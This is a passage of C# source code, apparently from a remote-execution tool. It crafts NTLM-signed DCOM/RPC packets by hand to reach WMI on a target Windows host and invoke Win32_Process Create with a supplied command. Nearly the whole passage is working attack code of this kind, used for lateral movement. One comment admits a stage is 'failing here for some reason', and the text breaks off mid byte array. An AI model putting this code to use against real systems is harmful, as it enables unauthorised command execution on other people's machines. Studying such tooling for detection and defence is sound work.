                        RPC_Sign = CombineByteArray(RPC_Sign, getByteRange(NTLMSSP_verifier, 0, 11));
                        byte[] RPC_signature = HMAC_MD5.ComputeHash(RPC_Sign);
                        RPC_signature = getByteRange(RPC_signature, 0, 7);
                        packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = RPC_signature;
                        NTLMSSP_verifier = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                        WMI_client_send = CombineByteArray(RPC, rem_query_interface);
                        WMI_client_send = CombineByteArray(WMI_client_send, NTLMSSP_verifier);
                        WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                        WMI_client_random_port_stream.Flush();
                        WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                        WMI_client_stage = "exit";


                        if (WMI_client_receive[2] == 3 && BitConverter.ToString(getByteRange(WMI_client_receive, 24, 27)) == "05-00-00-00")
                        {
                            Console.WriteLine("{0} WMI access denied on {1}", output_username, target_long);
                        }
                        else if (WMI_client_receive[2] == 3 && BitConverter.ToString(getByteRange(WMI_client_receive, 24, 27)) != "05-00-00-00")
                        {
                            string error_code = BitConverter.ToString(new byte[] { WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24] });
                            string[] error_code_array = error_code.Split('-');
                            error_code = string.Join("", error_code_array);
                            Console.WriteLine("Error Code: 0x{0}", error_code.ToString());
                        }
                        else if (WMI_client_receive[2] == 2)
                        {
                            WMI_data = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                            OXID_index = WMI_data.IndexOf(OXID);
                            OXID_bytes_index = OXID_index / 2;
                            object_UUID2 = getByteRange(WMI_client_receive, OXID_bytes_index + 16, OXID_bytes_index + 31);
                            WMI_client_stage = "AlterContext";
                        }
                        else
                        {
                            Console.WriteLine("Something went wrong");
                        }

                        Console.WriteLine("Attempting command execution");
                        int request_split_index = 5500;
                        string WMI_client_stage_next = "";
                        bool request_split = false;



                        while(WMI_client_stage != "exit")
                        {
                            if (WMI_client_receive[2] == 3)
                            {
                                string error_code = BitConverter.ToString(new byte[] { WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24] });
                                string[] error_code_array = error_code.Split('-');
                                error_code = string.Join("", error_code_array);
                                Console.WriteLine("Execution failed with error code: 0x{0}", error_code.ToString());
                                WMI_client_stage = "exit";
                            }

                            switch (WMI_client_stage)
                            {
                                case "AlterContext":
                                    {
                                        switch (sequence_number[0])
                                        {
                                            case 0:
                                                {
                                                    alter_context_call_ID = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    alter_context_context_ID = new byte[] { 0x02, 0x00 };
                                                    alter_context_UUID = new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 };
                                                    WMI_client_stage_next = "Request";


                                                }
                                                break;
                                            case 1:
                                                {
                                                    //Failing here for some reason.
                                                    alter_context_call_ID = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    alter_context_context_ID = new byte[] { 0x03, 0x00 };
                                                    alter_context_UUID = new byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 };
                                                    WMI_client_stage_next = "Request";
                                                }
                                                break;
                                            case 6:
                                                {
                                                    alter_context_call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                    alter_context_context_ID = new byte[] { 0x04, 0x00 };
                                                    alter_context_UUID = new byte[] { 0x99, 0xdc, 0x56, 0x95, 0x8c, 0x82, 0xcf, 0x11, 0xa3, 0x7e, 0x00, 0xaa, 0x00, 0x32, 0x40, 0xc7 };
                                                    WMI_client_stage_next = "Request";
                                                }
                                                break;
                                        }
                                        packet_RPC = GetPacketRPCAlterContext(assoc_group, alter_context_call_ID, alter_context_context_ID, alter_context_UUID);
                                        RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                                        WMI_client_send = RPC;
                                        WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                                        WMI_client_random_port_stream.Flush();
                                        WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                        WMI_client_stage = WMI_client_stage_next;
                                    }
                                    break;
                                case "Request":
                                    {
                                        switch (sequence_number[0])
                                        {
                                            case 0:
                                                {
                                                    sequence_number = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 12;
                                                    request_call_ID = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    request_context_ID = new byte[] { 0x02, 0x00 };
                                                    request_opnum = new byte[] { 0x03, 0x00 };
                                                    request_UUID = object_UUID2;
                                                    hostname_length = BitConverter.GetBytes(auth_hostname.Length + 1);
                                                    WMI_client_stage_next = "AlterContext";

                                                    if (Convert.ToBoolean(auth_hostname.Length % 2))
                                                    {
                                                        auth_hostname_bytes = CombineByteArray(auth_hostname_bytes, new byte[] { 0x00, 0x00 });
                                                    }
                                                    else
                                                    {
                                                        auth_hostname_bytes = CombineByteArray(auth_hostname_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                    }

                                                    stub_data = CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                    stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                                                    stub_data = CombineByteArray(stub_data, hostname_length);
                                                    stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                    stub_data = CombineByteArray(stub_data, hostname_length);
                                                    stub_data = CombineByteArray(stub_data, auth_hostname_bytes);
                                                    stub_data = CombineByteArray(stub_data, process_ID_Bytes);
                                                    stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                }
                                                break;
                                            case 1:
                                                {
                                                    sequence_number = new byte[] { 0x02, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 8;
                                                    request_call_ID = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    request_context_ID = new byte[] { 0x03, 0x00 };
                                                    request_opnum = new byte[] { 0x03, 0x00 };
                                                    request_UUID = IPID;
                                                    WMI_client_stage_next = "Request";
                                                    stub_data = CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                    stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                }
                                                break;
                                            case 2:
                                                {
                                                    sequence_number = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 0;
                                                    request_call_ID = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                    request_context_ID = new byte[] { 0x03, 0x00 };
                                                    request_opnum = new byte[] { 0x06, 0x00 };
                                                    request_UUID = IPID;
                                                    WMI_namespace_length = BitConverter.GetBytes(target_short.Length + 14);
                                                    WMI_namespace_unicode = Encoding.Unicode.GetBytes("\\\\" + target_short + "\\root\\cimv2");
                                                    WMI_client_stage_next = "Request";

                                                    if (Convert.ToBoolean(target_short.Length % 2))
                                                    {
                                                        WMI_namespace_unicode = CombineByteArray(WMI_namespace_unicode, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                    }
                                                    else
                                                    {
                                                        WMI_namespace_unicode = CombineByteArray(WMI_namespace_unicode, new byte[] { 0x00, 0x00 });
                                                    }

                                                    stub_data = CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                    stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                                                    stub_data = CombineByteArray(stub_data, WMI_namespace_length);
                                                    stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                    stub_data = CombineByteArray(stub_data, WMI_namespace_length);
                                                    stub_data = CombineByteArray(stub_data, WMI_namespace_unicode);
                                                    stub_data = CombineByteArray(stub_data, new byte[] { 0x04, 0x00, 0x02, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x2d, 0x00, 0x55, 0x00, 0x53, 0x00, 0x2c, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                }
                                                break;
                                            case 3:
                                                {
                                                    sequence_number = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 8;
                                                    request_context_ID = new byte[] { 0x00, 0x00 };
                                                    request_call_ID = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x05, 0x00 };
                                                    request_UUID = object_UUID;
                                                    WMI_client_stage_next = "Request";
                                                    WMI_data = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                                                    OXID_index = WMI_data.IndexOf(OXID);
                                                    OXID_bytes_index = OXID_index / 2;
                                                    IPID2 = getByteRange(WMI_client_receive, OXID_bytes_index + 16, OXID_bytes_index + 31);
                                                    OrderedDictionary packet_rem_release = GetPacketDCOMRemRelease(causality_ID_bytes, object_UUID2, IPID);
                                                    stub_data = ConvertFromPacketOrderedDictionary(packet_rem_release);
                                                }
                                                break;
                                            case 4:
                                                {
                                                    sequence_number = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 4;
                                                    request_context_ID = new byte[] { 0x00, 0x00 };
                                                    request_call_ID = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x03, 0x00 };
                                                    request_UUID = object_UUID;
                                                    WMI_client_stage_next = "Request";
                                                    packet_rem_query_interface = GetPacketDCOMRemQueryInterface(causality_ID_bytes, IPID2, new byte[] { 0x9e, 0xc1, 0xfc, 0xc3, 0x70, 0xa9, 0xd2, 0x11, 0x8b, 0x5a, 0x00, 0xa0, 0xc9, 0xb7, 0xc9, 0xc4 });
                                                    stub_data = ConvertFromPacketOrderedDictionary(packet_rem_query_interface);


                                                }
                                                break;
                                            case 5:
                                                {
                                                    sequence_number = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 4;
                                                    request_call_ID = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                    request_context_ID = new byte[] { 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x03, 0x00 };
                                                    request_UUID = object_UUID;
                                                    WMI_client_stage_next = "AlterContext";
                                                    packet_rem_query_interface = GetPacketDCOMRemQueryInterface(causality_ID_bytes, IPID2, new byte[] { 0x83, 0xb2, 0x96, 0xb1, 0xb4, 0xba, 0x1a, 0x10, 0xb6, 0x9c, 0x00, 0xaa, 0x00, 0x34, 0x1d, 0x07 });
                                                    stub_data = ConvertFromPacketOrderedDictionary(packet_rem_query_interface);
                                                }
                                                break;
                                            case 6:
                                                {
                                                    sequence_number = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 0;
                                                    request_context_ID = new byte[] { 0x04, 0x00 };
                                                    request_call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x06, 0x00 };
                                                    request_UUID = IPID2;
                                                    WMI_client_stage_next = "Request";
                                                    stub_data = CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                    stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                }
                                                break;
                                            case 7:
                                                {
                                                    sequence_number = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 0;
                                                    request_context_ID = new byte[] { 0x04, 0x00 };
                                                    request_call_ID = new byte[] { 0x10, 0x00, 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x06, 0x00 };
                                                    request_UUID = IPID2;
                                                    WMI_client_stage_next = "Request";
                                                    stub_data = CombineByteArray(new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, causality_ID_bytes);
                                                    stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                }
                                                break;
                                            default:
                                                {
                                                    if (sequence_number[0] >= 8)
                                                    {
                                                        sequence_number = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                        request_auth_padding = 0;
                                                        request_context_ID = new byte[] { 0x04, 0x00 };
                                                        request_call_ID = new byte[] { 0x0b, 0x00, 0x00, 0x00 };
                                                        request_opnum = new byte[] { 0x18, 0x00 };
                                                        request_UUID = IPID2;
                                                        byte[] stub_length = getByteRange(BitConverter.GetBytes(command.Length + 1769), 0, 1);
                                                        byte[] stub_length2 = getByteRange(BitConverter.GetBytes(command.Length + 1727), 0, 1); ;
                                                        byte[] stub_length3 = getByteRange(BitConverter.GetBytes(command.Length + 1713), 0, 1);
                                                        byte[] command_length = getByteRange(BitConverter.GetBytes(command.Length + 93), 0, 1);
                                                        byte[] command_length2 = getByteRange(BitConverter.GetBytes(command.Length + 16), 0, 1);
                                                        byte[] command_bytes = Encoding.UTF8.GetBytes(command);

                                                        string command_padding_check = Convert.ToString(Decimal.Divide(command.Length, 4));
                                                        if (command_padding_check.Contains(".75"))
                                                        {
                                                            Console.WriteLine("Adding One Byte\ncommand_padding_check: {0}", command_padding_check);
                                                            command_bytes = CombineByteArray(command_bytes, new byte[] { 0x00 });
                                                        }
                                                        else if (command_padding_check.Contains(".5"))
                                                        {
                                                            Console.WriteLine("Adding Two Bytes\ncommand_padding_check: {0}", command_padding_check);
                                                            command_bytes = CombineByteArray(command_bytes, new byte[] { 0x00, 0x00 });
                                                        }
                                                        else if (command_padding_check.Contains(".25"))
                                                        {
                                                            Console.WriteLine("Adding Three Bytes\ncommand_padding_check: {0}", command_padding_check);
                                                            command_bytes = CombineByteArray(command_bytes, new byte[] { 0x00, 0x00, 0x00 });
                                                        }
                                                        else
                                                        {
                                                            Console.WriteLine("Adding Four Bytes\ncommand_padding_check: {0}", command_padding_check);
                                                            command_bytes = CombineByteArray(command_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                        }
                                                        stub_data = new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                                                        stub_data = CombineByteArray(stub_data, causality_ID_bytes);
                                                        stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x06, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x63, 0x00, 0x72, 0x00, 0x65, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 });
                                                        stub_data = CombineByteArray(stub_data, stub_length);
                                                        stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00 });
                                                        stub_data = CombineByteArray(stub_data, stub_length);
                                                        stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x4d, 0x45, 0x4f, 0x57, 0x04, 0x00, 0x00, 0x00, 0x81, 0xa6, 0x12, 0xdc, 0x7f, 0x73, 0xcf, 0x11, 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24, 0x12, 0xf8, 0x90, 0x45, 0x3a, 0x1d, 0xd0, 0x11, 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24, 0x00, 0x00, 0x00, 0x00 });
                                                        stub_data = CombineByteArray(stub_data, stub_length2);
                                                        stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x78, 0x56, 0x34, 0x12 });
                                                        stub_data = CombineByteArray(stub_data, stub_length3);
                                                        stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x02, 0x53, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x03, 0x00, 0x00, 0x00, 0x2a, 0x00, 0x00, 0x00, 0x15, 0x01, 0x00, 0x00, 0x73, 0x01, 0x00, 0x00, 0x76, 0x02, 0x00, 0x00, 0xd4, 0x02, 0x00, 0x00, 0xb1, 0x03, 0x00, 0x00, 0x15, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x12, 0x04, 0x00, 0x80, 0x00, 0x5f, 0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45, 0x52, 0x53, 0x00, 0x00, 0x61, 0x62, 0x73, 0x74, 0x72, 0x61, 0x63, 0x74, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x94, 0x00, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x7c, 0x6c, 0x70, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x59, 0x01, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x11, 0x01, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0xe2, 0x01, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x7c, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x7c, 0x6c, 0x70, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x2b, 0x02, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xba, 0x02, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x2b, 0x02, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00, 0x72, 0x02, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x00, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x03, 0x00, 0x00, 0x00, 0x57, 0x4d, 0x49, 0x7c, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x66, 0x03, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44, 0x03, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xf5, 0x03, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x66, 0x03, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44, 0x03, 0x00, 0x00, 0xad, 0x03, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x6f, 